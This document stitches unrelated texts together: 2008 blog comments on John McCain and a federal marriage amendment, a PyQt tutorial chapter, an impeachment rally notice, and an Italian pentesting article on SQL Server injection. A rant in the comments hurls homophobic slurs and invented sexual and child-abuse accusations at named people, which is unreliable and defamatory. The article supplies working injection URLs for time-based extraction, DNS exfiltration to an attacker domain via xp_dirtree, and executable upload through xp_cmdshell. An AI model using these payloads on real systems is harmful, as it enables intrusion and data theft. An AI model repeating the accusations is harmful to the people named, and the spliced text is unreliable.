Even in your last sentence , the quotes around " threat " seem to suggest to me that you think his position is subject to change on some artificially contrived or easily imagined threat : " ... only that his beliefs in general are contrary to marriage equality ( which could result in an FMA push if he saw a " threat " ) "
This seems to me to be contrary to his history .
I 'm not saying to vote for him ( hey , how could you , his face is four colors ) , but I really do n't think he 's going to suddenly discover an afinity to an amendment that he so loudly opposed twice on the Senate floor .
If you do n't think I should " shame " you for that , well OK I wo n't .
But I still think that you are not correctly assessing McCain 's position on this specific issue .
Posted by : Timothy Kincaid | Feb 20 , 2008 4:17:03 PM
Timothy :
The word threat is in quotes because I find the idea that marriage equality could be threatening to anyone to be absurd .
What McCain has stated ( and what you even seem to agree with ) is that if a federal court casts a certain ruling granting marriage equality , he would back an FMA .
The federally - mandated equality is the " threat " to which I 'm referring .
While I understand your reasons for wanting to leave it to the states at this point in time in order to prevent backlash , it is unfair to say that I 'm falsely representing his position .
I said that " while he does n't call for a federal ban , it 's clear that he would absolutely get behind one if he saw such a need . "
In fact , he would if he saw a need ( a federal ruling ) .
Here , he 'll tell you as much himself :

WOW !!
Let 's just state his position and then we do n't need to dispute over whether the above posting accurately presents it .
Everyone can just know what he believes : John McCain believes that marriage should be restricted to a man and a woman .
He has , in the past , indicated that he is favorable to recognition of rights of gay couples outside of the structure of marriage .
However , he did endorse and campaign for an amendment in the state of Arizona which would ban both marriage and domestic partnerships .
McCain was also one of the most vocal opponents to the Federal Marriage Amendment .
It was not simply that he did n't favor the amendment , nor that he did n't vote for it .
He argued passionately against the FMA .
His argument was that states do and should define marriage .
And that which is best for a state is best known by those who live there .
In questioning , McCain has indicated that he would oppose every gay marriage amendement in all circumstances .
However , he laid out what would be a circumstance that could result in such an effort : if the federal courts sought to impose gay marriage on states that had sought to ban it .
Just as he does not favor the federal government telling states that they CANNOT allow gay marriage , he opposes the federal government telling states that they MUST allow gay marriage .
This is the " need " that was referenced above .
Further , if I understand what he was saying , McCain was not indicating that he would then favor a federal ban on gay marriage in all states , but rather that he would favor an amendment that returned to the states the right to define marriage within their state .
That is the " ban " that he would " absolutely get behind " that was referenced above .
Not a ban on gay marriage but a ban on federal interference .
Posted by : Timothy Kincaid | Feb 20 , 2008 4:54:41 PM
His 2004 statement ( made , it should be noted , while voicing opposition to the ban ) : ***
" If the Supreme Court of the United States rejects the Defense of Marriage Act as unconstitutional ; if state legislatures are frustrated by the decisions of jurists in more states than one , and if state remedies to such judicial activism fail ; and finally , if a large majority of Americans come to perceive that their communities ' values are being ignored and other standards concerning marriage are being imposed on them against their will , and that elections and state legislatures can provide no remedy then , and only then , should we consider , quite appropriately , amending the Constitution . "
***
In the one comment that blew this all out of proportion , all I said was that he would support the FMA if he saw a need .
While the likeliness of the above - described " need " might seem far - fetched , I am not comfortable with one who leaves this door even partially open ( on either side of the aisle ) .
To those of us who view equality as a right and these bans on all levels to be un-American and discriminatory , there is NEVER a justifiable " need " !

He ’s NOT virulently anti-gay , and that ’s the problem -- he ’s toying with the idea because he can smell the power of the presidency .
One look at how awkward his displays of “ conviction ” are tells the story .
Every time he slams his vertical fist on the podium and speaks with “ force , ” there is indecision in his voice , eyes , and body language .
I take him as more ethical than GW , but he strikes me as someone who ’s seriously wondering to themselves how much of their soul is " too much " to sell .
--
I watched him argue against the FMA on CSPAN at the time -- states rights , blah blah blah .
But he said the words , or something to the effect of ; “ between a man and a woman , ” in his speech like more than all the other senators ’ speeches combined .
Yes that ’s hyperbole , but whatever it was , it was obsequiously noticeable .

I ran across this too :
CNN LARRY KING LIVE
An Interview With John McCain
Aired May 24 , 2006
http://transcripts.cnn.com/TRANSCRIPTS/0605/24/lkl.01.html
KING : Do you support gay rights ?
MCCAIN : Yes , sir .
But I do not believe in -- I believe in the sanctity of heterosexual marriage .
KING : But did n't you support pro-union ?
MCCAIN : I will vote against -- yes .
I will vote against the constitutional amendment concerning gay marriage .
Gay union ...
KING : That would ban it .
That would ban gay marriage .
MCCAIN : Because I believe that the people of Arizona should make the decision concerning the sanctity of heterosexual marriage and union between a man and woman .
And I believe the people of Massachusetts should make their decision , and others .
I think it 's up to the states to make those decisions .
And by the way , that 's the federalist approach .
KING : I know .
And if Massachusetts would say it 's OK , then you ?
MCCAIN : I will respect the opinion of the people in Massachusetts .
But the people of Arizona , I hope , would decide that a union between man and woman has a unique status .
KING : Do you favor a civil union ?
MCCAIN : I think that ...
KING : Arizona proposed that .
MCCAIN : I think it depends on -- well , I would respect the majority opinion of the people in Arizona .
But a lot of times it depends on what do you mean by gay union ?
Does it mean that they 're able to enter into certain contracts , people have a partnership ?
I think so .
But to give it the status of heterosexual marriage is not something that I would support .
--
The problem as I see it , especially since he ’s been running , is that he ’s not secure enough with his own position to RESIST being pushed in the wrong direction .
Which is pretty much how I took the post .

In 2004 , when GWB used the FMA as a wedge issue to gain evangelical support , I basically did nothing to help him win .
If I see this happening with McCain I will do nothing to further his victory also .

A Warning for Barack Obama .
Concerning your upcoming debates with McCain .
Go as the Barack whose white mother comes from Bedford Stuyvesant and whose black father deserted him when he was less than two years old .
This is not the debate club .
This is not Confirmation class .
This is the boxing ring .
And best you be a Mohammed Ali .
He should have been your first pick as wise advisor , not your dear , if wise , family oriented wife .
You tell McCain : I do n't believe your prisoner of war shit any more than I believe you did n't have the questions ahead of time .
You tell them you do n't believe it , Barack , because you have an email from a mathematician who says it was probabilistically and experientially too obvious , the ease with which McCain answered the important first set of questions so presciently perfect .
Our mathematics can also prove that Iraq was an invasion of American Forces , not a coalition , other than in words .
And our bio-mathematical analysis also suggests that the conservatives are all perverse homosexual rapists and liars , collectively a Mark Foley , Larry Craig flag - shipped ludicrous bunch of power mad faggots .
Cindy McCain is a subordinate fem lesbian .
She goes down for the strap - on .
Up the ass .
It all fits with Cindy 's pill popping .
Ask her drug rehab psychiatrist .
Cindy was an upper class piece of cake for her rich parents who fucked her when she was a child as often happens to daughters in rich families in their having both the requisite perversity and the power to get away with it .
Take a second look at this blank eyed plaything who was McCain 's mistress while McCain trashed his first wife who waited faithfully for him the five years after McCain 's plane was shot down while bombing the life out of a hundred thousand Vietcong women , children and primitive men living in thatched huts whose prime sin in their napalmed life was that they lived in a land that had oil off its shores when the North Vietnamese were kid brothers of our Orwellian foe , the Russians .
Or , if your prefer the soapier explanation , McCain 's first wife was fucking for other soldiers even before John was shot down .
That 's as typical for military wives as it is for the daughters of the rich .
The military is too powerful in its officer rank to allow for anything vaguely resembling love except in a Ronald Reagan propaganda movie .
Contrast to Dwight Eisenhower 's love affair with his secretary that had no love in it because our General and President was admittedly impotent .
Typical for a Republican .
It 's the orderliness of living at that level of military hierarchical control that ends freedom .
If the soldier 's superior officer owns your husband , you 're not going to be nice to him ?
Rape and coercion is the reproductive strategy followed in the military , both heterosexual and homosexual .
Yes sir !
It 's said perfectly in the movie , The Sergeant , starring Rod Steiger , who was never hired again , blacklisted , after he made that piece of truth .
McCain ditched his unfaithful whore of a wife .
Or alternatively , if she really was June Allison , McCain messed her up bad by sneaking off with another woman , the aforesaid , child molested , Cindy , I like to have my tits pinched by my mother , McCain .
This is a slightly more realistic view than you may have , Barack .
Open your eyes to it or otherwise you can kiss your family goodbye .
Dukakis 's faithful loving wife , Kitty , started taking cough medicine like it was Gator Aide after they lost the election with egg on their faces .
It was n't what the Dukakis 's had succeeded at that mattered , Governor of Massachusetts and sparkly wife as presidential candidates .
It was what they did n't succeed at that mattered .
So Barack , put Michelle 's advice aside .
And listen to Mohammed Ali , I am the greatest , today .
In the next round , kick McCain in the balls .
We wrote a letter to your Denver Campaign Coordinator , Victoria Scott - Haynes , whose husband played football for the Denver Broncos , telling Victoria , way back in May , that your just taking the crap , as started in the ABC debate , is deadly .
But Victoria and the rest of your campaign are as blind to the reality of the game up at the next level as you are .
Your fate , Barack , is as in the movie , Field of Dreams , as the guy who gets one time at bat in the major leagues and strikes out .
If you lose , and you are going to if you do n't listen up , it will be , as we make clear on our website , your ass strewn across the backboard in a very public way with them waiting down below bucket of tar and basket of chicken feathers in hand .
We say all this scientifically , mathematically .
We agree with and actively defend Robert Scheer 's insight in the San Francisco Chronicle that Saakashvili and the Georgia war were schemed up intentionally to make McCain look good and fire up his once sputtering campaign and beat you .
It 's in the SF Chronicle .
Obampa Bumpa , you do n't get to play it a second time around , dummy .
So I suggest you pay attention to the insults hurled at you on www.matrix-evolutions.com for being such a chicken shit pretender , when what was expected and is still needed is that you be the fearless , out of the night , super hero leader you once promised to be with your tone and style .
You have superior talent .
You should be able to beat McCain , an ass fucking , military brat , liar .
You think his mother was any less a whore than his wives ?
And mummy owns her Johnny sonny boy next president like Aunt Tillie owns her aging Labrador Retriever .
Barak , baby , promise you will take risk quickly , throw Jesus and Pastor Warren and other rabbit foot superstition out of the car , and know , oh last hope of us all , that you have nothing to lose by completely putting your ass on the line .
There is no tomorrow for you , or for the rest of us .
Put some truth behind your saxophone .
Or toss it into the ocean and step aside and make room for Hillary .
While there 's still time to repair the huge hole torpedoed into the Democratic Part ship of state , the only Ship of State we have left , because if it goes down , competitive government shifts to the totalitarian , no real opposition , kind , aka , THE END .

Signals and Slots
In this chapter we begin with brief reviews of three tiny yet useful GUI applications written in PyQt .
We will take the opportunity to highlight some of the issues involved in GUI programming , but we will defer most of the details to later chapters .
Once we have a feel for PyQt GUI programming , we will discuss PyQt's " signals and slots " mechanism — this is a high - level communication mechanism for responding to user interaction that allows us to ignore irrelevant detail .
Although PyQt is used commercially to build applications that vary in size from hundreds of lines of code to more than 100 000 lines of code , the applications we will build in this chapter are all less than 100 lines , and they show just how much can be done with very little code .
In this chapter we will design our user interfaces purely by writing code , but in Chapter 7 , we will learn how to create user interfaces using Qt 's visual design tool , Qt Designer .
Python console applications and Python module files always have a .py extension , but for Python GUI applications we use a .pyw extension .
Both .py and .pyw are fine on Linux , but on Windows , .pyw ensures that Windows uses the pythonw .
exe interpreter instead of python.exe , and this in turn ensures that when we execute a Python GUI application , no unnecessary console window will appear . *
On Mac OS X , it is essential to use the .pyw extension .
The PyQt documentation is provided as a set of HTML files , independent of the Python documentation .
The most commonly referred to documents are those covering the PyQt API .
These files have been converted from the original C++/ Qt documentation files , and their index page is called classes .
html ; Windows users will find a link to this page in their Start button 's PyQt menu .
It is well worth looking at this page to get an overview of what classes are available , and of course to dip in and read about those classes that seem interesting .
The first application we will look at is an unusual hybrid : a GUI application that must be launched from a console because it requires command - line arguments .
We have included it because it makes it easier to explain how the PyQt event loop works ( and what that is ) , without having to go into any other GUI details .
The second and third examples are both very short but standard GUI applications .
They both show the basics of how we can create and lay out widgets ( " controls " in Windows - speak ) — labels , buttons , comboboxes , and other on - screen elements that users can view and , in most cases , interact with .
They also show how we can respond to user interactions — for example , how to call a particular function or method when the user performs a particular action .
In the last section we will cover how to handle user interactions in more depth , and in the next chapter we will cover layouts and dialogs much more thoroughly .
Use this chapter to get a feel for how things work , without worrying about the details :
The chapters that follow will fill in the gaps and will familiarize you with standard PyQt programming practices .
A Pop - Up Alert in 25 Lines
Our first GUI application is a bit odd .
First , it must be run from the console , and second it has no " decorations " — no title bar , no system menu , no X close button .
Figure 4.1 shows the whole thing .
To get the output displayed , we could enter a command line like this :
C:\>cd c:\pyqt\chap04 C:\pyqt\chap04>alert.pyw 12:15 Wake Up
When run , the program executes invisibly in the background , simply marking time until the specified time is reached .
At that point , it pops up a window with the message text .
About a minute after showing the window , the application will automatically terminate .
The specified time must use the 24 - hour clock .
For testing purposes we can use a time that has just gone ; for example , by using 12:15 when it is really 12:30 , the window will pop up immediately ( well , within less than a second ) .
Now that we know what it does and how to run it , we will review the implementation .
The file is a few lines longer than 25 lines because we have not counted comment lines and blank lines in the total — but there are only 25 lines of executable code .
We will begin with the imports .
import sys import time from PyQt4.QtCore import * from PyQt4.QtGui import *
We import the sys module because we want to access the command - line arguments it holds in the sys.argv list .
The time module is imported because we need its sleep ( ) function , and we need the PyQt modules for the GUI and for the QTime class .
app = QApplication(sys.argv )
We begin by creating a QApplication object .
Every PyQt GUI application must have a QApplication object .
This object provides access to global - like information such as the application 's directory , the screen size ( and which screen the application is on , in a multihead system ) , and so on .
This object also provides the event loop , discussed shortly .
When we create a QApplication object we pass it the command - line arguments ; this is because PyQt recognizes some command - line arguments of its own , such as - geometry and - style , so we ought to give it the chance to read them .
If QApplication recognizes any of the arguments , it acts on them , and removes them from the list it was given .
The list of arguments that QApplication recognizes is given in the QApplication 's initializer 's documentation .
try : due = QTime.currentTime ( ) message = " Alert ! " if len( sys.argv ) < 2 : raise ValueError hours , mins = sys.argv [ 1] .split ( " : " ) due = QTime ( int ( hours ) , int ( mins ) ) if not due.isValid ( ) : raise ValueError if len( sys.argv ) > 2 : message = " " .join(sys.argv [ 2 : ] ) except ValueError : message = " Usage : alert.pyw HH : MM [ optional message ] " # 24hr clock
At the very least , the application requires a time , so we set the due variable to the time right now .
We also provide a default message .
If the user has not given at least one command - line argument ( a time ) , we raise a ValueError exception .
This will result in the time being now and the message being the " usage " error message .
If the first argument does not contain a colon , a ValueError will be raised when we attempt to unpack two items from the split ( ) call .
If the hours or minutes are not a valid number , a ValueError will be raised by int( ) , and if the hours or minutes are out of range , due will be an invalid QTime , and we raise a ValueError ourselves .
Although Python provides its own date and time classes , the PyQt date and time classes are often more convenient ( and in some respects more powerful ) , so we tend to prefer them .
If the time is valid , we set the message to be the space - separated concatenation of the other command - line arguments if there are any ; otherwise , we leave it as the default " Alert ! " that we set at the beginning .
( When a program is executed on the command line , it is given a list of arguments , the first being the invoking name , and the rest being each sequence of nonwhitespace characters , that is , each " word " , entered on the command line .
The words may be changed by the shell — for example , by applying wildcard expansion .
Python puts the words it is actually given in the sys.argv list . )
Now we know when the message must be shown and what the message is .
while QTime.currentTime ( ) < due : time.sleep ( 20 ) # 20 seconds
We loop continuously , comparing the current time with the target time .
The loop will terminate if the current time is later than the target time .
We could have simply put a pass statement inside the loop , but if we did that Python would loop as quickly as possible , gobbling up processor cycles for no good reason .
The time . sleep ( ) command tells
Python to suspend processing for the specified number of seconds , 20 in this case .
This gives other programs more opportunity to run and makes sense since we do n't want to actually do anything while we wait for the due time to arrive .
Apart from creating the QApplication object , what we have done so far is standard console programming .
label = QLabel ( " < font color=red size=72 > < b > " + message + " </b></font > " ) label.setWindowFlags( Qt.SplashScreen ) label.show ( ) QTimer.singleShot(60000 , app.quit ) # 1 minute app.exec_ ( )
We have created a QApplication object , we have a message , and the due time has arrived , so now we can begin to create our application .
A GUI application needs widgets , and in this case we need a label to show the message .
A QLabel can accept HTML text , so we give it an HTML string that tells it to display bold red text of size 72 points .*
In PyQt , any widget can be used as a top - level window , even a button or a label .
When a widget is used like this , PyQt automatically gives it a title bar .
We do n't want a title bar for this application , so we set the label 's window flags to those used for splash screens since they have no title bar .
Once we have set up the label that will be our window , we call show ( ) on it .
At this point , the label window is not shown !
The call to show ( ) merely schedules a " paint event " , that is , it adds a new event to the QApplication object 's event queue that is a request to paint the specified widget .
Next , we set up a single - shot timer .
Whereas the Python library 's time . sleep ( ) function takes a number of seconds , the QTimer.singleShot ( ) function takes a number of milliseconds .
We give the singleShot ( ) method two arguments : how long until it should time out ( one minute in this case ) , and a function or method for it to call when it times out .
In PyQt terminology , the function or method we have given is called a " slot " , although in the PyQt documentation the terms " callable " , " Python slot " , and " Qt slot " are used to distinguish slots from Python 's __slots__ , a feature of new - style classes that is described in the Python Language Reference .
In this book we will use the PyQt terminology , since we never use __slots__ .
Signals and slots 127
So now we have two events scheduled : A paint event that wants to take place immediately , and a timer timeout event that wants to take place in a minute 's time .
The call to app.exec_ ( ) starts off the QApplication object 's event loop . *
The first event it gets is the paint event , so the label window pops up on - screen with the given message .
About one minute later the timer timeout event occurs and the QApplication. quit ( ) method is called .
This method performs a clean termination of the GUI application .
It closes any open windows , frees up any resources it has acquired , and exits .
Event loops are used by all GUI applications .
In pseudocode , an event loop looks like this :
while True : event = getNextEvent ( ) if event : if event == Terminate : break processEvent ( event )
When the user interacts with the application , or when certain other things occur , such as a timer timing out or the application 's window being uncovered ( maybe because another application was closed ) , an event is generated inside PyQt and added to the event queue .
The application 's event loop continuously checks to see whether there is an event to process , and if there is , it processes it ( or passes it on to the event 's associated function or method for processing ) .
Figure 4.2
Batch processing applications versus GUI applications
Although complete , and quite useful if you use consoles , the application uses only a single widget .
Also , we have not given it any ability to respond to user interaction .
It also works rather like traditional batch - processing programs .
It is invoked , performs some processing ( waits , then shows a message ) , and terminates .
Most GUI programs work differently .
Once invoked , they run their event loop and respond to events .
Some events come from the user — for example , key presses and mouse clicks — and some from the system , for example , timers timing out and windows being revealed .
They process in response to requests that are the result of events such as button clicks and menu selections , and terminate only when told to do so .
The next application we will look at is much more conventional than the one we 've just seen , and is typical of many very small GUI applications generally .

There can be no business as usual as long as our rights and system of government are under attack .
We must hold legislators to their oaths .
Our State Legislators can simply move our memorials along to the floor of the US House .
Let ’s let them know that we cannot accept anything less .
Join folks from Washington For Impeachment , Citizens to Impeach Bush and Cheney , Veterans For Peace , The Peace Academy , Eastside FOR , World Ca n’t Wait , and many others .
We ’ll meet at the sun dial for speeches , theater and parading around noon , weather permitting .
Bring your soapbox and signs !
Impeachment is the remedy for abuse of power .

Gli attacchi di tipo SQL Injection sono ben noti da vari anni nella
comunità , sia in termini di modalità di esecuzione , sia in termini di
impatto .
Un attacco riuscito può avere molteplici conseguenze , che
vanno dal mettere in pericolo la confidenzialità e integrità dei dati
immagazzinati nel DB , al consentire il bypass di sistemi di
autenticazione , fino in molti casi permettere all ’intruso di impartire
comandi direttamente al sistema operativo , trasformando quindi una
vulnerabilità di tipo applicativo in una porta di accesso
all ’infrastruttura .
In questo articolo ci concentreremo su Microsoft SQL Server , e dopo un
breve accenno alle tecniche di SQL Injection basata su inference
analizzeremo la possibilità di utilizzare il protocollo DNS per creare
un tunnel che trasporti i dati cercati , siano essi tabelle del DB o i
risultati di un comando impartito al sistema operativo sottostante .
L’articolo è ovviamente rivolto ai penetration tester e a chiunque
altro possa sperimentare con questi concetti in maniera legale .
Si assume una buona conoscenza di SQL Server , di TSQL ( il « dialetto » SQL
di Microsoft ) e delle tecniche di blind SQL Injection , oltre che un
minimo di dimestichezza con il protocollo DNS .
In - band , Out - of - Band , Inference …
In molti casi , le modalità di exploiting possono risultare molto
semplici : immettere semplicemente la stringa ' or ' a '= 'a in un input
field può talvolta essere sufficiente per aggirare una pagina di login .
Altre volte , aggiungere una UNION SELECT ad una query può facilmente
garantirci l’accesso ad una qualsiasi tabella del database .
In altri
casi , infine , basta una chiamata a xp_cmdshell ( una ben nota extended
procedure che consente di impartire comandi al sistema operativo ) per
avere l’output dei nostri comandi direttamente nella pagina HTML .
In
tutti questi casi , i dati cercati vengono restituiti all ’interno della
stessa connessione HTTP utilizzata per l’injection e in genere si parla
di « in - band injection » .
In altre situazioni , quando non è possibile ottenere i dati
direttamente nella pagina HTML , è possibile avviare una seconda
connessione che consenta il trasferimento dell ’informazione , e si parla
in questo caso di “ out - of - band injection ” : è possibile per esempio
utilizzare OPENROWSET , un comando che consente ad un DB Server di
connettersi ad un altro DB Server per scambiare dati .
L’intruso dovrà
semplicemente avere una istanza di SQL Server in ascolto sulla sua
macchina e dire al DB Server attaccato come collegarsi ad essa .
Nel caso invece in cui si stia puntando ad una shell sul sistema
operativo , è possibile creare , sempre con xp_cmdshell , un FTP script
che , una volta lanciato , scarichi netcat .exe e lanci una shell diretta o
inversa .
Nel primo caso netcat si metterà in ascolto su una porta in
locale , nel secondo contatterà invece una porta in ascolto sulla
macchina che effettua l’attacco .
E’ però importante notare che questi scenari appena descritti non sono
possibili laddove vi sia un firewall che filtri tali connessioni , ed è
in questi casi più “ estremi ” che viene utilizzato il terzo tipo di
attacco , quello « inference based » .
Le tecniche basate su inferenza sono state abbondantemente illustrate
già nel 2005 da David Litchfield .
In
questo tipo di attacco , non avviene alcun trasferimento effettivo di
dati : l ’informazione viene “ estratta ” ( di solito un bit alla volta )
iniettando una serie di query e osservando il comportamento del DB
server remoto .
Questo tipo di attacco non è strettamente l’argomento dell ’articolo , e
per i dettagli vi rimando al link riportato sopra , ma la sua eleganza
merita almeno un esempio .
Diciamo di avere a che fare con una pagina asp
vulnerabile nel suo parametro numerico a , e ipotizziamo che le
seguenti richieste restituiscano pagine in un qualche modo diverse :
https://www.victim.com/vuln.asp?a=1
https://www.victim.com/vuln.asp?a=2
L’idea consiste nell ’iniettare nel parametro a una query che vada a
misurare il valore di un bit di informazione a cui siamo interessati , e
a seconda del valore di tale bit faccia sì che a valga 1 oppure 2 .
La
pagina che otterremo in risposta ci permetterà a quel punto di
stabilire il valore di tale bit .
Ammettendo , ad esempio .
di voler
estrarre il nome dell ’utente che sta effettuando le query , potremo
utilizzare , per generare il parametro a , la seguente query :
1 + select ( ascii( substring ( ( select system_user ) , 1,1 ) ) &1 )
che , nel nostro URL , diventa :
https://www.victim.com?a=1%2Bselect+(ascii(substring((select+system_user),1,1))%261)
Cosa succede qui ?
Analizziamo a partire dalle parentesi più interne .
Per prima cosa , estraiamo il nome dell ’utente con select system_user .
Da questo nome , estraiamo il primo carattere con substring ( ) .
Di tale
carattere troviamo il valore numerico con ascii ( ) .
Mettiamo infine
questo valore in bitwise AND con 1 per trovare il valore del bit meno
significativo .
A seconda che il valore di questo bit sia 0 o 1 , a
varrà rispettivamente 1 o 2 , e quindi riceveremo la risposta al primo o
al secondo degli URL sopra menzionati , permettendoci di stabilire il
valore di questo bit .
Che non è male , ma siccome un bit da solo è poco
utile , dovremo ripetere la procedura per gli altri bit di questo
carattere .
Poi passare al secondo carattere e così via .
Le cose si complicano ulteriormente se la risposta del server è
identica indipendentemente dal valore del parametro vulnerabile : in
questo caso non è più possibile ricostruire il dato a partire dal
codice HTML ricevuto , ma possiamo legare il suo valore ad altre entità ,
ad esempio il tempo che ci mette il nostro server a rispondere alla
richiesta , come nel caso seguente :
https://www.victim.com/vuln.asp?a=1;if+ascii(substring((select+system_user),1,1)%261>0+waitfor+delay+'0:0:3'
Analizziamo questa richiesta : Microsoft SQL Server ( bontà sua ) ci
consente di effettuare più query in batch separandole da un punto e
virgola .
In questo caso , iniettiamo una nuova query che andrà ad
estrarre lo stesso bit cercato prima .
La differenza è che , se il bit ha
valore 1 , il DB dovrà aspettare 3 secondi prima di rispondere .
Ecco
quindi che , misurando il tempo che ci mette la nostra applicazione a
rispondere alla nostra richiesta , possiamo di nuovo estrarre i dati cercati .
È evidente che un sistema simile può andare bene per estrarre
quantità limitate di informazione , ma non per effettuare il dump di
interi database .
Ammettendo che il valore di un bit sia 1 o 0 con uguale
probabilità , ci troviamo ad aver bisogno in media di 1.5 secondi per
estrarne uno .
Potremmo diminuire l’argomento di WAITFOR DELAY , ma con il
serio rischio di introdurre errori dovuti alla latenza di rete .
DNS is your friend !
Ed è per risolvere questo problema di efficienza che , finalmente ,
veniamo al cuore di questo articolo , in cui andiamo a descrivere un
altro possibile approccio , che può essere definito « out - of - band » ma che
non ha bisogno di alcuna connessione diretta tra noi e il DB Server .
L’idea consiste nell ’utilizzare il protocollo DNS per creare un tunnel
che ci invii i dati cercati .
Il primo a studiare le potenzialità di
questo protocollo per trasportare dati è stato Dan Kaminsky ,
e in questa sede vedremo due delle tante
implementazioni di questo concetto : la prima è stata esposta per la
prima volta da Patrik Karlsson a Defcon15 mentre la
seconda è quella utilizzata dal tool sqlninja .
Due prerequisiti per poter utilizzare con successo questa tecnica :
la macchina da cui effettuiamo l’attacco deve essere DNS autoritativo per un dominio ( es. : stacktrace .
it ) il DNS Server del DB che stiamo attaccando deve poter risolvere domini esterni
La prima condizione è facile da ottenere , con un investimento di pochi
euro .
La seconda sfugge ovviamente al nostro controllo , ma
fortunatamente ( o sfortunatamente , dipende dai punti di vista ) sono
poche le reti in cui i DNS interni non sono autorizzati a risolvere
domini arbitrari .
L’idea è di iniettare una query che faccia , nell ’ordine , le seguenti
azioni :
estrarre il dato da inviare , nel nostro caso il nome
dell ’utente ( es. : sa , l’utente amministrativo di
default su SQL Server ) creare un hostname composto dal dato stesso e dal dominio sotto controllo
( quindi , nel nostro esempio , sa.stacktrace.it ) in qualche modo , costringere il DB Server a cercare di risolvere quel nome
Questo genererà una richiesta da parte del DB Server al DNS locale , che
a sua volta effettuerà un forward all ’indirizzo IP autoritativo per il
dominio stacktrace .it , ovvero la nostra macchina , la quale non dovrà
fare altro che restare in ascolto sulla porta 53 , ricevere la richiesta
ed estrarre il dato cercato dalla richiesta .
Ci sono vari modi per far generare la richiesta al DNS Server : uno dei
più semplici è offerto da xp_dirtree , una extended procedure di SQL
Server che restituisce , sotto forma di lista , l’albero delle directory
che dipendono dalla directory passata come parametro alla procedura ,
come nel seguente esempio :
exec master ..xp_dirtree ' C :\'
Quello che rende xp_dirtree estremamente utile è che può essere
eseguita da qualsiasi utente indipendentemente dai suoi privilegi , e che
il parametro di input può contenere un host remoto , come nel seguente
esempio :
exec master..xp_dirtree ' \www.stacktrace.it\c:\'
Lanciare una query di questo tipo constringerà il DB server a cercare
di risolvere l’host www.stacktrace.it , generando quindi una richiesta
DNS che verrà inoltrata al DNS Server autoritativo per il dominio
stacktrace.it.
Riassumendo , per avere il nome dell ’utente remoto , potremo semplicemente
iniettare la seguente query :
exec master..xp_dirtree '\ '+( select system_user ) +'.stacktrace.it\c :\'
che , inserita nell ’URL con l’encoding richiesto , diventa :
https://www.victim.com/vuln.asp?a=1;exec+master..xp_dirtree+%27%5C%5C%27%2B%28select+system_user%29%2B%27.stacktrace.it%5Cc%3A%5C%27
Semplice no ?
Certo , ma ci sono un pò di complicazioni che devono essere
risolte per poter utilizzare questa tecnica in via un pò più generale .
L’esempio appena visto risolve infatti un caso estremamente semplice , e
in un caso reale dovremo tenere conto delle seguenti problematiche :
un hostname può contenere al massimo 255 caratteri ; se vogliamo
trasferire maggiori quantità di dati è necessario utilizzare
più richieste ogni segmento dell ’ hostname ( ad esempio la stringa stacktrace in
sa.stacktrace.it può essere al massimo 63 caratteri ; quindi ,
per usare nomi così lunghi , dovremo fare attenzione ad
interporre dei dot ( . ) nelle posizioni giuste un hostname è case - insensitive e può contenere solo caratteri
alfanumerici e il carattere - ; se il dato che
vogliamo trasferire contiene altri caratteri , per ottenere un
domain name che sia corretto dovremo pensare ad una qualche codifica
Con qualche riga di codice , la cosa non è troppo difficile : Patrik
Karlsson risolve la cosa con del semplice TSQL , e per i dettagli vi
rimando alla sua presentazione .
Noi qui ci concentreremo sull ’implementazione di sqlninja , che punta
invece all ’ottenimento di una shell sul DB remoto e che utilizza , per
il tunneling DNS dei risultati dei vari comandi , un eseguibile ad- hoc
che fa da agente remoto ( dnstun.exe ) .
Ma qui incontriamo un ulteriore problema : come trasferire un eseguibile
se , come abbiamo detto , il firewall non consente alcuna connessione che
non sia HTTP ?
La risposta è DEBUG.EXE , il debugger di Windows che è
installato di default in tutti i sistemi operativi Microsoft .
Non
entriamo troppo nei dettagli per non andare fuori tema ( magari se ne
parlerà in maniera più approfondita in un altro articolo ) , ma questo
tool ha il pregio di poter ricevere in input uno script con la
successione di comandi desiderata .
In particolare , noi utilizzeremo uno script che opererà in questo modo :
aprirà un nuovo file ( che diventerà il nostro eseguibile ) scriverà in memoria i byte dell ’eseguibile , nelle locazioni corrispondenti salverà il file su disco , pronto per essere utilizzato
Per farvi un ’idea , un esempio di tale script ( che crea il file
netcat.exe ) è disponibile sul sito di sqlninja .
Uno script simile può essere generato facilmente a partire
dall ’eseguibile corrispondente utilizzando numerosi tool disponibili in
rete ( per esempio l’eccellente dbgtool.exe ) , e può essere inviato , riga per riga , sul DB remoto
con una serie di xp_cmdshell .
L’upload , quindi , seguirà i seguenti step .
Innanzitutto , viene
trasferito l’intero script , riga per riga :
https://www.victim.com/vuln.asp?a=1;exec+master..xp_cmdshell+'echo+n+dnstun.com+>+dnstun.scr'
https://www.victim.com/vuln.asp?a=1;exec+master..xp_cmdshell+'echo+r+cx+>>+dnstun.scr'
.....
Poi viene lanciato debug.exe , con lo script in input :
https://www.victim.com/vuln.asp?a=1;exec+master..xp_cmdshell+'debug.exe+<+dnstun.scr'
Infine , non resta che rinominare il file ( perchè debug.exe si rifiuta
di operare direttamente su file .exe )
https://www.victim.com/vuln.asp?a=1;exec+master..xp_cmdshell+'ren+dnstun.com+dnstun.exe'
Complicato ?
Fortunatamente sqlninja fa tutto in maniera automatizzata , e
questo ci consente di tornare ad occuparci di cosa deve fare il nostro
agente remoto .
I passi che vengono seguiti sono ( con qualche
approssimazione ) i seguenti :
il comando da eseguire ( per esempio , dir C:\ ) viene passato via
SQL Injection a dnstun.exe , insieme al dominio da utilizzare per il
tunnel e la lunghezza degli hostname da usare : https://www.victim.com/vuln.asp?a=1;exec+master..xp_cmdshell+'dnstun.exe+stacktrace.it+255+dir+c:\' dnstun.exe usa CreateProcess ( ) per lanciare il comando e usa una
pipe per intercettare il suo output man mano che l’output arriva sulla pipe , questo viene codificato
in Base32 ( anzi , una sua versione leggermente modificata ) : viste le
limitazioni che abbiamo nei caratteri che possono costituire un
hostname , possiamo trasferire al massimo 5 bit per carattere ; per non
dover spendere spazio in padding , vengono codificati chunk di output la
cui lunghezza è un multiplo esatto di 5 La versione codificata dell ’ output viene utilizzata per creare gli
hostname da risolvere ; all ’inizio di ogni hostname viene inoltre
aggiunto un contatore ( perchè le richieste , una volta ricevute , possano
essere riordinate ) e una flag che segnala se la richiesta corrente è
l ’ultima o se ne devono essere attese altre per ogni hostname generato in questo modo , viene semplicemente
chiamata gethostbyname( ) , che penserà a tutto il resto
In Figura 1 vediamo le richieste effettuate .
Per chiarezza , abbiamo
utilizzato hostname di soli 64 caratteri totali .
Nel dettaglio :
l ’alfabeto utilizzato per codificare l’output del comando usa le lettere da
